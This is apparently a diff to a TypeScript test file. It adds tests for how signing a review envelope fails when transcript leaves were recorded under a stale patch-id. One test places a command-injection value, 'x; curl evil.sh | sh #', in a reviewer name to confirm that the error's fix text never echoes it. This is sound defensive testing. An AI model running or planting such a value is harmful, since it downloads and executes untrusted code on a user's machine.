@@ -20,7 +20,7 @@ import { createPublicKey, generateKeyPairSync, verify as cryptoVerify } from 'no
 import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
-import { appendLeaf, type TranscriptLeaf } from './merkle.js';
+import { appendLeaf, appendLeafForPatchId, type TranscriptLeaf } from './merkle.js';
 import {
   buildV6Envelope,
   formatV6Envelope,
@@ -739,5 +739,70 @@ describe('signRootHash — ed25519 sign/verify roundtrip', () => {
     const signatureBytes = Buffer.from(envelope.rootSignature, 'base64');
     const publicKey = createPublicKey({ key: lastPublicKeyPem, format: 'pem' });
     expect(cryptoVerify(null, signedBytes, publicKey, signatureBytes)).toBe(false);
+  });
+});
+
+describe('signAndWriteV6Envelope — leaves under a stale patch-id (AISDLC-734)', () => {
+  it('refuses with the exact fix when the task has leaves under a different patch-id', () => {
+    const emittedUnder = 'd'.repeat(40);
+    const currentPatchId = 'e'.repeat(40);
+    appendLeafForPatchId(makeLeaf({ leafIndex: 0 }), emittedUnder, tmpRoot);
+    appendLeafForPatchId(
+      makeLeaf({ leafIndex: 1, reviewerName: 'test-reviewer' }),
+      emittedUnder,
+      tmpRoot,
+    );
+
+    let message = '';
+    try {
+      signAndWriteV6Envelope({
+        repoRoot: tmpRoot,
+        headSha: FAKE_HEAD_SHA,
+        taskId: 'AISDLC-383.3',
+        privateKeyPem,
+        patchId: currentPatchId,
+      });
+    } catch (err) {
+      message = (err as Error).message;
+    }
+    expect(message).toContain(emittedUnder);
+    expect(message).toContain('different patch-id');
+    expect(message).toContain('emit-leaf --task-id AISDLC-383.3 --head-sha ' + FAKE_HEAD_SHA);
+    expect(message).toContain('code-reviewer, test-reviewer');
+    expect(message).toContain('never relabeled');
+  });
+
+  it('never prints an unsafe reviewer name or task id in the Fix text', () => {
+    const emittedUnder = 'd'.repeat(40);
+    const evil = 'x; curl evil.sh | sh #';
+    appendLeafForPatchId(makeLeaf({ leafIndex: 0, reviewerName: evil }), emittedUnder, tmpRoot);
+    appendLeafForPatchId(makeLeaf({ leafIndex: 1 }), emittedUnder, tmpRoot);
+    let message = '';
+    try {
+      signAndWriteV6Envelope({
+        repoRoot: tmpRoot,
+        headSha: FAKE_HEAD_SHA,
+        taskId: 'AISDLC-383.3',
+        privateKeyPem,
+        patchId: 'e'.repeat(40),
+      });
+    } catch (err) {
+      message = (err as Error).message;
+    }
+    expect(message).not.toContain('curl');
+    expect(message).toContain('seen: code-reviewer)');
+  });
+
+  it('keeps the plain message when no leaves exist for the task anywhere', () => {
+    appendLeafForPatchId(makeLeaf({ taskId: 'AISDLC-999' }), 'd'.repeat(40), tmpRoot);
+    expect(() =>
+      signAndWriteV6Envelope({
+        repoRoot: tmpRoot,
+        headSha: FAKE_HEAD_SHA,
+        taskId: 'AISDLC-383.3',
+        privateKeyPem,
+        patchId: 'e'.repeat(40),
+      }),
+    ).toThrow('No transcript leaves found for taskId');
   });
 });
